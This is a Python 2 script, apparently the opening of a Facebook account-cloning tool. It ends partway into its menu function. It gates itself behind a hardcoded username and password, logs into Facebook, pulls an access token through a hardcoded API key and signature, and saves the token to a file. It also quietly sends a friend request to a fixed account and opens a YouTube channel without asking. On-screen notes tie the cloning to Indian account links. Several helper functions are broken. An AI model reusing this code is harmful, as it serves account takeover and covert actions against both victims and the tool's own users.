#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To shabirbaloch
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:King__x__Malik
##### LOGO #####
logo = """
      \033[1;91m:  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ : 
      \033[1;92m:  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ : 
      \033[1;93m: 
Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´      Ñ‚Ð¦Ð—ÐÐ¯Ð”â•¡ÐÐ¯Ð”â–‘ÐÐ¯Ð”â–“ÐÐ¯Ð”â”¤ÐÐ¯Ð”â–’ÐÐ¯Ð”â•›ÐÐ¯Ð”â•›ÐÐ¯Ð”â•‘Ñ‚Ð¦Ð—     Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ : 

@@@  @@                                  @@  @@@
 @@@@@@                                 @@@@@@
  @@@@@           88888888888           @@@@@
    @@@@        888888888888888        @@@@
      @@@@    8888888888888888888    @@@@
        @@@@888 88888888888888 8888@@@@
           8888  888888888888  88888@
          88888    88888888    888888
          88888      8888      888888
          888888888888888888888888888
           88888888888  888888888888
            88888888      888888888
             8888888888888888888888
              88888888888888888888
                8888888888888888
             @@@@ ||||||||||| @@@@
           @@@@   |||||||||||  @@@@
          @@@@                   @@@@ 
        @@@@@                      @@@@@
     @@ @@@        King x Malik        @@@ @@

\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´@@@@@@@@@King x Malik@@@@@@@@@"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
  \033[1;96m          Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´  Ñ‚Ð¥â–’Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¥â–“  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ 
  \033[1;96m          Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ Ñ‚Ð¦Ð¥Ñ‚Ð¦Ð¥Ñ‚Ð¥â–“Ñ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¥â–’Ñ‚Ð¦ÐŸÑ‚Ð¦ÐŸ Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
  \033[1;96m          Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ Ñ‚Ð¦Ð¥Ñ‚Ð¦Ð¥Ñ‚Ð¦Ð’Ñ‚Ð¥â–’Ñ‚Ð¥â–“Ñ‚Ð¦Ð’Ñ‚Ð¦ÐŸÑ‚Ð¦ÐŸ Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
 \033[1;96m           Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´  Ñ‚Ð¥â–“Ñ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¥â–’  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
 \033[1;96m           Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´  Ñ‚Ð¦Ð¥Ñ‚Ð¥â–“Ñ‚Ð¦Ð’Ñ‚Ð¦Ð’Ñ‚Ð¥â–’Ñ‚Ð¦ÐŸ  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
 \033[1;96m           Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´  Ñ‚Ð¥â–’Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¤ÐšÑ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¦Ð¤Ñ‚Ð¥â–“  Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
  \033[1;96m          Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
       \033[1;93m    Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Welcome To Malik0176‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜
\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mKingxMalik\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´
\033[1;94mAuthor    \033[1;91m: \033[1;91mMalik0176
\033[1;94mMalik0176\033[1;91m: \033[1;91Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð£Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜]99.9
\033[1;94mFacebook  \033[1;91m: \033[1;91mNill
\033[1;94mWhatsapp  \033[1;91m: \033[1;91m+923156673626
\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mKingxMalik\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"""
jalan('\033[1;92m   .........................Malik0176.........................:')
jalan("\033[1;93m   Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ Welcome to Malik0176 Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´   ")
jalan('\033[1;93m Ñ‚Ð¨Ð® Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Login New AcountÑ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜  ')
jalan('\033[1;93m Ñ‚Ð¨Ð® Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜ CP Acount Open After 7 Days Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜  ')
jalan("\033[1;93m Ñ‚Ð¨Ð® Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Frends Cloning k liy sirf indian id ka link usâ”œÐ¸ karainÑ‚Ð¤Ð˜ ")
jalan("\033[1;93m Ñ‚Ð¨Ð® Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜WhatsApp Num :  +923156673626Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜Ñ‚Ð¤Ð˜")
print "\033[1;95m   Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mLogin King x Malik\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"

CorrectUsername = "king"
CorrectPassword = "malik"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;94mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ÐÐ¯Ð£Ð› \x1b[1;91mTool Username \x1b[1;91mâ”¬â•—â”¬â•— \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´ÐÐ¯Ð¤Ð¡\x1b[1;91mTool Password \x1b[1;91mâ”¬â•—â”¬â•— \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;93mStay Home Stay Safe Save lives Save Pakistan' )
                jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;97mPray NAMAZ five time Daily' )
                jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;97mwear mask on your mouth every time ' )
                jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;97mDont go to in markets ' )
		jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;97mwash your hands every 1 hour' )
		jalan(' \033[1;92m     Notice:Ñ‚Ð¨Ð® \033[1;97mUsername or password k liyh whatsAPP no. pr contact krain
                jalan(' \033[1;92m    Warning:Ñ‚Ð¨Ð® \033[1;95mCloning k liay sirf indian link use karain' )
		
		print "\033[1;95m      Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²\033[1;96mB4Baloch\033[1;95mÑ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
		print('\033[1;93mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´LOGIN WITH FACEBOOKÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:love_hacker
	print logo
